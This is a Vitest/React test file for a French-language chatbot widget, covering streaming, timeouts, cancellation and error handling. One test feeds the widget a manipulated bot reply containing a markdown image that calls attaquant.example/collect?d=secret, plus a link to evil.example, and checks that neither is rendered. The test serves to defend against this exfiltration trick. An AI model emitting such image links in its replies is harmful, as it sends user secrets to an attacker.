import { beforeEach, describe, expect, it, vi } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import Chatbot from "./Chatbot";
import { ChatbotError } from "../utils/chatbotApi";

// Doublure simple plutot que vi.fn() : le suivi des resultats d'un vi.fn() derive une promesse
// supplementaire qui, si l'appel rejette, est signalee comme rejet non gere et fait echouer le test.
type AskImpl = (question: string, options: { signal: AbortSignal; onDelta: (text: string) => void }) => Promise<string>;
const stub = vi.hoisted(() => ({ impl: (async () => "") as unknown as AskImpl, calls: 0 }));
vi.mock("../utils/chatbotApi", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../utils/chatbotApi")>();
  return {
    ...actual,
    askChatbotStream: (question: string, options: { signal: AbortSignal; onDelta: (text: string) => void }) => {
      stub.calls++;
      return stub.impl(question, options);
    },
  };
});

const openChat = async () => {
  await userEvent.click(screen.getByRole("button", { name: "Ouvrir le chatbot" }));
};

const send = async (text: string) => {
  await userEvent.type(screen.getByPlaceholderText("Posez votre question..."), text);
  await userEvent.click(screen.getByRole("button", { name: "Envoyer" }));
};

describe("Chatbot", () => {
  beforeEach(() => {
    stub.calls = 0;
    stub.impl = async () => "";
  });

  it("affiche la reponse du bot", async () => {
    stub.impl = async (_q, { onDelta }) => { onDelta("Le délai est de **15"); onDelta(" jours**."); return "Le délai est de **15 jours**."; };
    render(<Chatbot />);
    await openChat();

    await send("Délai d'opposition ?");

    expect(await screen.findByText("15 jours")).toBeInTheDocument();
  });

  /** Le bug : sans delai, un service bloque laissait la saisie desactivee jusqu'au rechargement. */
  it("apres un delai depasse, affiche l'erreur et reactive la saisie", async () => {
    stub.impl = async () => {
      throw new ChatbotError("Le chatbot met trop de temps à répondre.", "timeout");
    };
    render(<Chatbot />);
    await openChat();

    await send("Bonjour");

    expect(await screen.findByText(/met trop de temps à répondre/)).toBeInTheDocument();
    const input = screen.getByPlaceholderText("Posez votre question...");
    expect(input).toBeEnabled();
    expect(screen.queryByText("Le bot réfléchit...")).not.toBeInTheDocument();
  });

  it("le bouton Annuler abandonne la requete et rend la main", async () => {
    let signal: AbortSignal | undefined;
    stub.impl = (_q, opts) => {
      signal = opts.signal;
      return new Promise((_resolve, reject) => {
        opts.signal.addEventListener("abort", () => reject(new ChatbotError("Requête annulée.", "cancelled")));
      });
    };
    render(<Chatbot />);
    await openChat();
    await send("Question longue");

    await userEvent.click(await screen.findByRole("button", { name: "Annuler la requête" }));

    await waitFor(() => expect(signal?.aborted).toBe(true));
    expect(await screen.findByText(/Réponse annulée/)).toBeInTheDocument();
    expect(screen.getByPlaceholderText("Posez votre question...")).toBeEnabled();
  });

  it("n'affiche jamais d'image ou de lien issus d'une reponse manipulee", async () => {
    stub.impl = async (_q, { onDelta }) => { const t = "Solde : 100 DH ![](https://attaquant.example/collect?d=secret) [cliquez](https://evil.example)"; onDelta(t); return t; };
    const { container } = render(<Chatbot />);
    await openChat();

    await send("Solde ?");

    await screen.findByText(/Solde : 100 DH/);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });

  it("deux messages successifs ont des cles distinctes (pas de doublon de rendu)", async () => {
    stub.impl = async (_q, { onDelta }) => { onDelta("Réponse"); return "Réponse"; };
    render(<Chatbot />);
    await openChat();

    await send("un");
    await screen.findAllByText("Réponse");
    await send("deux");

    await waitFor(() => expect(screen.getAllByText("Réponse")).toHaveLength(2));
  });

  it("affiche la reponse au fil de l'eau, morceau par morceau", async () => {
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => { release = resolve; });
    stub.impl = async (_q, { onDelta }) => {
      onDelta("Le délai ");
      await gate; // le reste n'est pas encore arrive
      onDelta("est de 15 jours.");
      return "Le délai est de 15 jours.";
    };
    render(<Chatbot />);
    await openChat();

    await send("Délai ?");

    // Premier morceau deja visible alors que la reponse n'est pas terminee.
    expect(await screen.findByText(/Le délai/)).toBeInTheDocument();
    expect(screen.queryByText(/15 jours/)).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Annuler la requête" })).toBeInTheDocument();

    release();
    expect(await screen.findByText(/est de 15 jours/)).toBeInTheDocument();
  });

  it("une erreur en cours de flux conserve le texte deja recu", async () => {
    stub.impl = async (_q, { onDelta }) => {
      onDelta("Début de la réponse");
      throw new ChatbotError("Le service d'IA est momentanément indisponible.", "unavailable");
    };
    render(<Chatbot />);
    await openChat();

    await send("Question");

    expect(await screen.findByText(/Début de la réponse/)).toBeInTheDocument();
    expect(await screen.findByText(/momentanément indisponible/)).toBeInTheDocument();
    expect(screen.getByPlaceholderText("Posez votre question...")).toBeEnabled();
  });
});
